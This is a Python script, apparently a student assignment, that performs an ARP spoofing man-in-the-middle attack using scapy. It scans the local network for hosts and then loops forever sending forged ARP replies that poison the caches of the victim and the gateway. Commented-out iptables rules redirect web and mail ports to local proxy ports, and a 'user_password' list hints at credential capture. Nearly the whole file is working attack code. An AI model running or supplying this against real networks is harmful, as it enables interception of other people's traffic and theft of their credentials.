#!/usr/bin/env python3
# coding: utf-8
"""
Author: Kuan Ju, Chen
ID: 0711529
Date: 2021/04/22
"""

from scapy.all import *
import time
import os
log_path = "./logdir/"
user_password = []

# set the iptables
# os.system("sudo iptables --flush")
# os.system("sudo iptables -t nat -F")
# os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
# os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443")
# os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443")
# os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 456 -j REDIRECT --to-ports 8443")
# os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443")
# os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8443")


# global variables
attacker_ip = "192.168.0.23"
gateway_ip = "192.168.0.1"
gateway_mac = "d8:c4:97:c2:cf:f2"
victim_ip = ["192.168.0.45"]
victim_mac = ["0c:9d:92:05:00:7e"]

def arp_scan(ip):
	global gateway_ip, gateway_mac, victim_ip, vicitm, victim_mac
	request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
	
	ans, unans = srp(request, timeout=2, retry=1, verbose=False)
	
	print("----------------------------------------")
	print("IP\t\tMAC")
	print("----------------------------------------")
	for sent, received in ans:
		if received.psrc == gateway_ip:
			gateway_mac = received.hwsrc
			continue
		else:
			victim_ip.append(received.psrc)
			victim_mac.append(received.hwsrc)
		print(received.psrc+"\t"+received.hwsrc)
			
	if	victim_ip == "":
		exit("Network error !")
	
def get_network_info():
	global gateway_ip, gateway_mac, victim_ip, vicitm, victim_mac, attacker_ip
	attacker_ip = get_if_addr(conf.iface)
	gateway_ip = conf.route.route("0.0.0.0")[2]

def arp_spoofing():
	global gateway_ip, gateway_mac, victim_ip, vicitm, victim_mac	
	"""
	Do the arp spoofing to the victim windows.
	We can use "arp -a" at victim to see whether the gateway mac change to attacker's mac.
	"""
	victim_arp = []
	route_arp = []
	for i in range(len(victim_ip)):
		victim_arp.append(ARP(op=2,psrc=gateway_ip,pdst=victim_ip[i],hwdst=victim_mac[i])) # hwsrc is default ( attacker's mac )
		route_arp.append(ARP(op=2, psrc=victim_ip[i], pdst=gateway_ip, hwdst=gateway_mac))
	# print(victim_arp.show())
	# print(victim_arp.summary())
	while 1:
		for i in range(len(victim_ip)):
			send(victim_arp[i], verbose=False)
			send(route_arp[i], verbose=False)
		time.sleep(2)
		
def print_network_info():
	print()
	print("Network Info")
	print("attacker_ip = ", attacker_ip)
	print("gateway_ip = ", gateway_ip)
	print("gateway_mac = ", gateway_mac)
	# print("victim_ip = ", victim_ip)
	# print("victim_mac = ", victim_mac)
	print()
	
def main():
	# get_network_info()
	# print_network_info()	
	# scan_ip = gateway_ip[:-1]+'0/24' #192.168.1.0/24
	# arp_scan(scan_ip)
	arp_spoofing()
	
if __name__ == '__main__':
	main()
